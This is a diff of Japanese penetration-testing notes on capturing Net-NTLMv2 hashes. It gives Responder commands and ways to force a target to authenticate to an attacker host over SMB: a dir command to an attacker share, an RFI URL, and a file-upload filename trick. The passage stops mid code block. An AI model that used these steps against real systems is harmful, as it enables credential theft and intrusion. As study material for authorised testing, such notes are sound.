@@ -356,18 +356,22 @@ Local Group Memberships [*Administrators以外]
 ### Net-NTLMv2クラッキング手順 w/SMB
 
 1. 攻撃者側でResponderを用意する
-	- SMBサーバーとして動作
 ```zsh
 sudo responder -I <interface(tun0等)>
 ```
 
 2. ターゲット上から攻撃者のResponderにNet-NTLMv2認証をさせる
-- 方法A：ターゲットシェルを獲得(方法割愛)し、ターゲット上から攻撃者上の存在しないSMB共有にアクセスさせる
+- 方法A：ターゲットシェルを獲得し、ターゲット上から攻撃者上の存在しないSMB共有にアクセスさせる
 ```powershell
 dir \\<AttackerIP>\hoge
 ```
 
-- 方法B：Webアプリケーションでファイルアップロードし、攻撃者上の存在しないSMB共有にアクセスさせる
+・方法B : WebアプリでRFIの脆弱性を利用して、ターゲットから攻撃者上の存在しないSMB共有にアクセスさせる
+```sh
+http://example/page=http://<AttackerIP>/
+```
+
+- 方法C：Webアプリでファイルアップロードし、攻撃者上の存在しないSMB共有にアクセスさせる
 	- ⚠️ファイルアップロード機能が==SMBを介して可能である場合に==成功する
 	- Burp Suiteなどでfilenameパラメタを以下の値に変更してリクエストする
 ```
